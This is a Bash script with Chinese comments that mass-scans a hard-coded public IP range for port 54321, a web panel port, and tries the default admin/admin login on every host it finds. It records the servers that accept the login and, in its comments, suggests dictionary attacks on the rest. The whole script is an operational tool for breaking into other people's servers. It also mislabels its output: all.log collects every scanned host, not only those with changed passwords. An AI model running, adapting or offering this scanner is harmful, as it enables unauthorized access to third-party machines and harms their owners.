#!/bin/bash
# 早年一些某ui的一键安装脚本采用admin/admin的弱密码，很多人都懒得改，因此可以针对开放默认端口54321的服务器逐一尝试登录
# week.log里面就是所有扫出来的可以弱口令登录的机器，挺容易扫出来的
# all.log是改了密码的机器，有兴趣可以尝试进一步字典枚举

RED="\e[1;31m"
GREEN="\e[1;32m"
YELLOW="\e[1;33m"
BLUE="\e[1;34m"
PINK="\e[1;35m"
QING="\e[1;36m"
OTHER="\e[1;$[RANDOM%7+31]m"
END="\e[0m"

# 定义扫描的参数
ip='66.152' # 前两段ip地址
range_1='169' # 第三段ip地址开始
range_2='170' # 第三段ip地址范围

# 删除文件
rm -rf result.txt week.log all.log 

for ((i=range_1; i<=range_2; i++)); do
  echo -e "${YELLOW}将扫描 ${ip}.${range_1}.1/24 - ${ip}.${range_2}.1/24${END}"
  echo -e "${QING}正在扫描 ${ip}.${i}.1/24:54321${END}"
  
  nmap -Pn -p 54321 -T4 ${ip}.${i}.1/24 --open >> result.txt
  
  # 提取ip地址到ip.txt文件，按照第三列和第四列数字升序排序的去重后的IP地址列表
  grep -E -o "([0-9]{1,3}\.){3}[0-9]{1,3}" result.txt | sort -t. -k3,3n -k4,4n | uniq > ip.txt
  
  for ip_ad in $(sed -n 'p' ip.txt); do
    res1=$(curl "http://${ip_ad}:54321/login"  --max-time 5 --data-raw 'username=admin&password=admin' --compressed  --insecure)
    res2=$(curl "https://${ip_ad}:54321/login" --max-time 5 --data-raw 'username=admin&password=admin' --compressed  --insecure)
    if [[ "$res1" =~ .*true.* ]]; then
        echo $ip_ad | tee >> week.log
    fi
        echo $ip_ad | tee >> all.log
    if [[ "$res2" =~ .*true.* ]]; then
        echo $ip_ad | tee >> week.log
    fi
        echo $ip_ad | tee >> all.log
  done;
done

echo -e "执行完成，${GREEN}week.log${END}是可登录的机器，${YELLOW}all.log${END}是改了密码的机器"
echo -e "可登录的ip如下："
cat week.log | uniq
